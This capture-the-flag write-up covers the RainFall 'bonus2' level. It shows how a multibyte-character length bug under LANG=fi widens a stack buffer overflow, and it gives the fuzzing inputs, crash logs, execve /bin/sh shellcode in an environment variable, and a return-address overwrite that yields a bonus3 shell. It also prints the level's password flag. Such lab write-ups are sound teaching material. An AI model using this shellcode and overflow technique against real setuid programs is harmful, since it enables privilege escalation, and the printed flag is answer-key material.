# Bonus 2

Basically, the program want 2 arguments then prints "Hello <first argument>":

```bash
bonus2@RainFall:~$ ./bonus2 Aris Patala
Hello Aris
```

It takes the first 40 characters of the first arg and the first 32 characters of the second arg.
Knowing this we can try to put the maximum characters possible just to try.

```bash
bonus2@RainFall:~$ ./bonus2 $(python -c 'print("0" * 40)') $(python -c 'print("A" * 32)')
Hello 0000000000000000000000000000000000000000AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
bonus2@RainFall:~$ dmesg
[54393.877399] bonus2[13245]: segfault at 8004141 ip 08004141 sp bffff550 error 14 in bonus2[8048000+1000]
```

Quickly, we can see that we've managed to overflow on the return address,
but it looks like it wasn't enough as it only copied 3 bytes.
The two trailing `A`s and the `\x00` from the end of the string.
This is not very usefull because there is nowhere we want to return
in the range of address `0x08000000` to `0x0800ffff`

There is another feature of the program though,
if we change the LANG environement variable to `"nl"` or `"fi"`, it changes the output.

```bash
bonus2@RainFall:~$ export LANG=fi
bonus2@RainFall:~$ ./bonus2 Finnish language
Hyvää päivää Finnish
bonus2@RainFall:~$ export LANG=nl
bonus2@RainFall:~$ ./bonus2 Dutch language
Goedemiddag! Dutch
```
Is this somewhat exploitable? Yes.
The code counts each characters of `Hyvää päivää` as a one-byte char.
However this is not the case as `ä` takes 2 bytes.
This means that we will overflow EVEN MORE than before,
so we should be able to overwrite the whole address.

```bash
bonus2@RainFall:~$ ./bonus2 $(python -c 'print("0" * 40)') aaaabbbbccccddddeeeeffffgggghhhh
Hyvää päivää 0000000000000000000000000000000000000000aaaabbbbccccddddeeeeffffgggghhhh
Segmentation fault (core dumped)
[56193.264606] bonus2[13260]: segfault at 66666565 ip 66666565 sp bffff550 error 14
```

Nice, we see that we now have full control over the address.
Now we can use the same trick as in bonus0 to have a shellcode on the arguments,
and then point to the shellcode to redirect execution.

```bash
bonus2@RainFall:~$ export SHELLCODE=$(python -c 'print("\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
bonus2@RainFall:~$ ./bonus2 0000111122223333444455556666777788889999 000011112222333344`echo -ne "\x92\xf8\xff\xbf"`55666677778
8889999
Hyvää päivää 0000111122223333444455556666777788889999000011112222333344����5566667777
$ whoami
bonus3
$ cd ../bonus3
$ cat .pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

## .pass: 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587